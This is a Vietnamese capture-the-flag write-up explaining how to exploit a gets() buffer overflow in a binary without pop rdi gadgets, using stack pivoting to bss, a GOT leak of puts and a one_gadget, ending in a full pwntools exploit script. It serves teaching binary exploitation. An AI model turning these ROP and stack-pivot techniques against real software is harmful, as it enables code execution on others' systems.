---
title: "ret2libc-advance"
date: 2025-02-11 00:00:00 +0800
categories: [pwn]
tags: [technical]
author: "kuvee"
layout: post
published: false
---

- hôm nay ta sẽ đến với 1 thử thách được biên dịch ở 1 phiên bản libc cao -> sẽ không còn các gadget hữu ích như **pop rdi** hay **pop rsi** nữa

## introduce

- ở bài này đơn giản sẽ là sử dụng 1 hàm nguy hiểm như **gets** , và bug **bof** rất rõ ràng , ở đây ta cũng có hàm puts 

```c
int vuln()
{
  char s[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("Enter your string");
  gets(s);
  puts("You typed: ");
  return puts(s);
}
```

- tuy nhiên ta sẽ không thể có các gadget như **pop rdi** , **pop rsi** ở bài này , ta có thể kiểm tra nhanh bằng ropper : 


```cs
ploi@kuvee:~/pwn/ret2libc_advance/bof7_advance1/docker/share$ ropper -f bypass_patched
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004010ac: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040111e: adc dword ptr [rax], edi; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004010b0: adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010dc: adc edi, dword ptr [rax]; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040114c: adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004010b4: add ah, dh; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010ae: add bh, bh; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100e: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x00000000004011f2: add byte ptr [rax], al; add byte ptr [rax], al; call 0x3195; mov eax, 0; pop rbp; ret;
0x00000000004011fc: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret;
0x00000000004010de: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401120: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004010bc: add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x00000000004011f4: add byte ptr [rax], al; call 0x3195; mov eax, 0; pop rbp; ret;
0x0000000000401188: add byte ptr [rax], al; mov rdi, rax; call 0x3070; nop; pop rbp; ret;
0x00000000004011fe: add byte ptr [rax], al; pop rbp; ret;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax;
0x000000000040100d: add byte ptr [rax], al; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e0: add byte ptr [rax], al; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401122: add byte ptr [rax], al; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401202: add byte ptr [rax], al; endbr64; sub rsp, 8; add rsp, 8; ret;
0x00000000004010be: add byte ptr [rax], al; endbr64; ret;
0x00000000004010b3: add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040115b: add byte ptr [rcx], al; pop rbp; ret;
0x00000000004010ad: add dil, dil; adc eax, 0x2f3b; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x000000000040100a: add eax, 0x2fe9; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x0000000000401017: add esp, 8; ret;
0x0000000000401016: add rsp, 8; ret;
0x00000000004011d7: call 0x3060; nop; leave; ret;
0x000000000040118d: call 0x3070; nop; pop rbp; ret;
0x0000000000401151: call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004011ec: call 0x3176; mov eax, 0; call 0x3195; mov eax, 0; pop rbp; ret;
0x00000000004011f6: call 0x3195; mov eax, 0; pop rbp; ret;
0x00000000004010af: call qword ptr [rip + 0x2f3b]; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401014: call rax;
0x0000000000401014: call rax; add rsp, 8; ret;
0x00000000004010b1: cmp ebp, dword ptr [rdi]; add byte ptr [rax], al; hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401006: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax;
0x0000000000401012: je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010db: je 0x30f0; mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x00000000004010e5: je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040111d: je 0x3130; mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401127: je 0x3130; mov edi, 0x404040; jmp rax;
0x00000000004010ec: jmp rax;
0x00000000004011d1: lea eax, [rbp - 0x50]; mov rdi, rax; call 0x3060; nop; leave; ret;
0x00000000004011d0: lea rax, [rbp - 0x50]; mov rdi, rax; call 0x3060; nop; leave; ret;
0x00000000004011d3: mov al, 0x48; mov edi, eax; call 0x3060; nop; leave; ret;
0x0000000000401156: mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004011f1: mov eax, 0; call 0x3195; mov eax, 0; pop rbp; ret;
0x00000000004011fb: mov eax, 0; pop rbp; ret;
0x00000000004010dd: mov eax, 0; test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x000000000040111f: mov eax, 0; test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114f: mov ebp, esp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004010e7: mov edi, 0x404040; jmp rax;
0x00000000004011d5: mov edi, eax; call 0x3060; nop; leave; ret;
0x000000000040118b: mov edi, eax; call 0x3070; nop; pop rbp; ret;
0x00000000004011d2: mov r8b, 0x48; mov edi, eax; call 0x3060; nop; leave; ret;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x000000000040114e: mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x00000000004011d4: mov rdi, rax; call 0x3060; nop; leave; ret;
0x000000000040118a: mov rdi, rax; call 0x3070; nop; pop rbp; ret;
0x00000000004010b8: nop dword ptr [rax + rax]; endbr64; ret;
0x00000000004010b7: nop dword ptr cs:[rax + rax]; endbr64; ret;
0x00000000004010b6: nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401007: or byte ptr [rax - 0x75], cl; add eax, 0x2fe9; test rax, rax; je 0x3016; call rax;
0x00000000004010e6: or dword ptr [rdi + 0x404040], edi; jmp rax;
0x000000000040115d: pop rbp; ret;
0x000000000040114d: push rbp; mov rbp, rsp; call 0x30d0; mov byte ptr [rip + 0x2eeb], 1; pop rbp; ret;
0x0000000000401011: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x0000000000401209: sub esp, 8; add rsp, 8; ret;
0x0000000000401005: sub esp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x0000000000401208: sub rsp, 8; add rsp, 8; ret;
0x0000000000401004: sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010ba: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; endbr64; ret;
0x0000000000401010: test eax, eax; je 0x3016; call rax;
0x0000000000401010: test eax, eax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e3: test eax, eax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401125: test eax, eax; je 0x3130; mov edi, 0x404040; jmp rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax;
0x000000000040100f: test rax, rax; je 0x3016; call rax; add rsp, 8; ret;
0x00000000004010e2: test rax, rax; je 0x30f0; mov edi, 0x404040; jmp rax;
0x0000000000401124: test rax, rax; je 0x3130; mov edi, 0x404040; jmp rax;
0x0000000000401207: cli; sub rsp, 8; add rsp, 8; ret;
0x0000000000401003: cli; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c3: cli; ret;
0x0000000000401204: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x3016; call rax;
0x00000000004010c0: endbr64; ret;
0x00000000004010b5: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x00000000004011dd: leave; ret;
0x0000000000401192: nop; pop rbp; ret;
0x00000000004011dc: nop; leave; ret;
0x00000000004010ef: nop; ret;
0x000000000040101a: ret;

99 gadgets found
```

- ta cũng không hề có bất kì hàm win nào , vậy chỉ còn cách là leak libc và lấy shell , tuy nhiên leak libc như thế nào?  , ta sẽ cùng để ý qua những đoạn sau : 

    - ở đây nó sẽ **lea rax,[rbp-0x50]** và địa chỉ từ rax sẽ được mov vào rdi và dùng **puts** để in ra , vậy nếu rbp-0x50 là 1 **got_address** thì sao , nghĩa là ta hoàn toàn có thể leak libc khi kết hợp các gadget này 
    - tuy nhiên do **rbp** lúc này là địa chỉ stack nên ta phải sử dụng **stack_pivot** để pivot đến dữ liệu mà ta có thể điều khiển được 


```cs
0x00000000004011b0 <+27>:    lea    rax,[rbp-0x50]
0x00000000004011b4 <+31>:    mov    rdi,rax
0x00000000004011b7 <+34>:    mov    eax,0x0
0x00000000004011bc <+39>:    call   0x401080 <gets@plt>
0x00000000004011c1 <+44>:    lea    rax,[rip+0xe4e]        # 0x402016
0x00000000004011c8 <+51>:    mov    rdi,rax
0x00000000004011cb <+54>:    call   0x401060 <puts@plt>
0x00000000004011d0 <+59>:    lea    rax,[rbp-0x50]
0x00000000004011d4 <+63>:    mov    rdi,rax
0x00000000004011d7 <+66>:    call   0x401060 <puts@plt>
```

- đầu tiên , ý tưởng sẽ là dùng gets để ghi đè rbp -> bss , ở đây ta hoàn toàn có thể setup để ghi dữ liệu vào và điều khiển chương trình
- nhưng ta sẽ ghi như thế nào , ta sẽ tưởng tượng như sau , ta sẽ muốn leak libc_puts , địa chỉ got của nó là **0x404018** , vậy đầu tiên ta sẽ ghi nó vào bss với giá trị **0x404018** và nó sẽ là save_rbp thứ 2 của ta để khi quay trở lại : 

```cs
0x00000000004011d0 <+59>:    lea    rax,[rbp-0x50]
0x00000000004011d4 <+63>:    mov    rdi,rax
0x00000000004011d7 <+66>:    call   0x401060 <puts@plt>
```

- ta sẽ hoàn thành việc leak ở giai đoạn này , nó sẽ trông như sau : 

```cs
payload1

padding : offset 
save_rbp : bss + xxx
save_rip : 0x00000000004011b0   (gets)

payload2 
padding : offset
save_rbp_2 : got_puts+0x50
save_rip : 0x00000000004011d0 (puts)
```

```c
gets_gadget = 0x00000000004011b0
puts_gadget = 0x00000000004011d0
leave_ret = 0x00000000004011dd
bss = 0x404000+0x700

input()
pl1 = flat(
        'a'*0x50,
        bss,
        gets_gadget,
        )

p.sendlineafter(b'string\n',pl1)

pl2 = flat(
        'b'*0x50,
        exe.got.puts+0x50,
        puts_gadget,
        )
```
- và ta sẽ leak libc được ở đây , tuy nhiên do save_rip tiếp theo chưa được ghi vào bss , nên khi **leave_ret** nó hoàn toàn không có hàm nào để nhảy đến khiến việc leak được libc trở nên vô nghĩa

![leak](/assets/images/leak.png)

- ý tưởng của mình là trước hết sẽ ghi địa chỉ của hàm vuln vào địa chỉ sau khi leak libc xong trước , tiếp theo là ghi got puts vào bss và quay trở lại để in ra , nó sẽ trông như sau : 

tuy nhiên thì ở đây nó sẽ bị lỗi vì lúc này địa chỉ stack khá nhỏ 0x4040b0 so với 0x404000 nên các lệnh push sẽ trừ stack xuống và gây ra lỗi ...

```c
gets_gadget = 0x00000000004011b0
puts_gadget = 0x00000000004011d0
leave_ret = 0x00000000004011dd
bss = 0x404000+0x600
bss2 = 0x404000+0x400
input()
pl1 = flat(
        'a'*0x50,
        exe.got.puts+0x50+0x50,
        gets_gadget,
        )

p.sendlineafter(b'string\n',pl1)

pl2 = flat(
        exe.sym.vuln,
        exe.sym.vuln,
        'a'*0x40,
        bss2,
        gets_gadget,
        )
input()
p.sendline(pl2)

pl3 = flat(
        'a'*0x50,
        exe.got.puts + 0x50,
        puts_gadget,
        )
input()
p.sendline(pl3)
```

- vì vậy ta sẽ suy ngẫm lại , ở đây vì hàm **gets** sẽ được nhập không giới hạn nên ý tưởng của ta là sẽ setup tất cả các **saved_rbp** và **saved_rbp** trong 1 lần luôn :

- ta sẽ quyết định ghi vào exe.got.puts+0x50 trước (đây sẽ là nơi sau khi leak xong thì thằng puts nó sẽ return về địa chỉ này) :

```c
pl1 = flat(
        'a'*0x50,
        exe.got.puts+0x50+0x50,
        gets_gadget,
        )
```

-  từ đây ta phải setup các saved_rbp tiếp theo , ta sẽ tính toán offset đến **saved_rbp** tiếp theo và **saved_rbp** tiếp theo sẽ là **got@puts+0x50** và saved_rip tiếp theo là **puts@gadget** 
-  sau lệnh puts thì nó sẽ ret về **got@puts+0x50** và lúc này ta đã leak xong nên ta sẽ cần ret về main , tuy nhiên thì stack nó sẽ rất thấp và dẫn đến lỗi , vì vậy ta cần setup **save_rbp** đến 1 địa chỉ bss cao hơn và **saved_rip** đến hàm main , nó sẽ trông như sau :

```python
pl1 = flat(
        'a'*0x50,
        exe.got.puts+0x50+0x50,
        gets_gadget,
        )

p.sendlineafter(b'string\n',pl1)

pl2 = flat(
        bss2+0x10,
        leave_ret,
        'a'*0x40,
        bss2,
        leave_ret,
        'a'*(0x390-16-0x48),
        exe.got.puts+0x50,
        puts_gadget,
        0,
        exe.sym.main
        )
input()
p.sendline(pl2)
```

- ta cần debug nhiều lần để tìm ra những offset đến **saved_rbp** và **saved_rip** tiếp theo

- cuối cùng sau khi leak xong thì đơn giản là **ret2libc** , ở đây mình dùng **og**

exp : 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

gdb.attach(p,gdbscript='''
          b*0x00000000004011bc
          b*0x00000000004011de

          ''')

gets_gadget = 0x00000000004011b0
puts_gadget = 0x00000000004011d0
leave_ret = 0x00000000004011dd
bss = 0x404000+0x600
bss2 = 0x404000+0x400

#input()
pl1 = flat(
        'a'*0x50,
        exe.got.puts+0x50+0x50,   #saved_rbp1
        gets_gadget,  #saved_rip1
        )

p.sendlineafter(b'string\n',pl1)

pl2 = flat(
        bss2+0x10,  #saved_rbp_4
        leave_ret, #saved_rip_4
        'a'*0x40,
        bss2,  #saved_rbp_2
        leave_ret, #saved_rip_2
        'a'*(0x390-16-0x48),
        exe.got.puts+0x50, #saved_rbp_3
        puts_gadget, #saved_rip_3
        0,  #saved_rbp_5
        exe.sym.main #saved_rbp_6
        )
input()
p.sendline(pl2)

p.recvuntil(b'You typed: ')
p.recvlines(4)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x80e50
log.info(f'leak libc: {hex(libc.address)}')

pop_rdi = 0x000000000002a3e5 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
pop_rdx_r12 = 0x000000000011f2e7 + libc.address
onegadget = 0xebc88+libc.address

pl3 = b'a'*0x50
pl3 += p64(bss)
pl3 += p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0)*2 + p64(onegadget)

input()
p.sendline(pl3)


p.interactive()
```


nguồn : [here](https://www.youtube.com/watch?v=WWhjNl_G_74&t=1618s)

